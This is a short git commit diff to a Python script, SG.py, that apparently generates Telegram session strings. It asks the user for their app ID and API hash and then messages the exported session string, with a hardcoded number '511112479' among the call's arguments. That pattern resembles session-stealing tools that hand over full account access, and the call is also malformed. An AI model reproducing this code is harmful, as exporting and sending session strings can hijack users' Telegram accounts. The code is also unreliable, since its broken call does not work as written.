dd2d4c30c64d320b77895cf5719fee78a41fb564
MOHAMMAD AMAAN <amaankhan66666@gmail.com>
2023-05-06 09:16:36 +0530

    Update SG.py

--- SG.py
+++ SG.py
@@ -32,7 +32,7 @@ print(w+"")
 APP_ID = int(input("PLEASE ENTER TELEGRAM APP ID: "))
 API_HASH = input("PLEASE ENTER TELEGRAM API HASH: ")
 with Client(":memory:", api_id=APP_ID, api_hash=API_HASH, in_memory=True) as app:
-        app.send_message(user.id, 
+        app.send_message(message.user.id, 
         "511112479", 
         f"{app.export_session_string()}"
         )
